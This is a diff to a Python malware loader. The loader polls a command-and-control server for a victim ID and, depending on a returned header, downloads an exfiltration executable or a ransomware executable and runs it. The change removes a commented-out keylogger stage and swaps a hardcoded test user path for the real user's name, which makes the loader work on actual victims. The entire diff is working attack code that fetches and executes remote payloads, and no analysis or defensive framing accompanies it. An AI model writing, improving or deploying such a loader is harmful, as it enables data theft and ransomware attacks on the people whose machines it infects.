@@ -220,21 +220,20 @@ class Loader:
             sleep(30)
         if httpx.get(f"{c2_url}/sync/{self.victim_id}").headers["Action"] == "1":
             self.load_exfiltration_stage()
-        # elif httpx.get(f"{c2_url}/sync/{self.victim_id}").headers["Action"] == "2":
-        #     self.load_keylogger_stage()
-        if httpx.get(f"{c2_url}/sync/{self.victim_id}").headers["Action"] == "3":
+        if httpx.get(f"{c2_url}/sync/{self.victim_id}").headers["Action"] == "2":
             self.load_ransomware_stage()
         else:
             sleep(30)
 
     def load_exfiltration_stage(self):
         # print("Load exfiltration stage...")
-        if not os.path.isfile("C:\\Users\\Test\Documents\\exfil.exe"):
+        dl_path = f"C:\\Users\\{os.environ['USERNAME']}\\Documents"
+        if not os.path.isfile(f"{dl_path}\\exfil.exe"):
             try:
                 exfiltration_url = httpx.get(f"{c2_url}/static/exfiltration/exfil.exe")
-                with open("C:\\Users\\Test\Documents\\exfil.exe", "wb") as f:
+                with open(f"{dl_path}\\exfil.exe", "wb") as f:
                     f.write(exfiltration_url.content)
-                os.system("C:\\Users\\Test\Documents\\exfil.exe")
+                os.system(f"{dl_path}\\exfil.exe")
                 self.sync_loop(init_sleep=60)
             except httpx.TimeoutException as err:
                 print("load_exfiltration(): Timeout Error --> ", err)
@@ -250,12 +249,13 @@ class Loader:
     def load_ransomware_stage(self):
         # print("Load ransomware stage...")
         # check if ransom.exe exists
-        if not os.path.isfile("C:\\Users\\Test\Documents\\ransom.exe"):
+        dl_path = f"C:\\Users\\{os.environ['USERNAME']}\\Documents"
+        if not os.path.isfile(f"{dl_path}\\ransom.exe"):
             try:
                 ransomware_url = httpx.get(f"{c2_url}/static/ransomware/ransom.exe")
-                with open("C:\\Users\\Test\Documents\\ransom.exe", "wb") as f:
+                with open(f"{dl_path}\\ransom.exe", "wb") as f:
                     f.write(ransomware_url.content)
-                os.system("C:\\Users\\Test\Documents\\ransom.exe")
+                os.system(f"{dl_path}\\ransom.exe")
                 self.sync_loop(init_sleep=60)
             except httpx.TimeoutException as err:
                 print("load_exfiltration(): Timeout Error --> ", err)
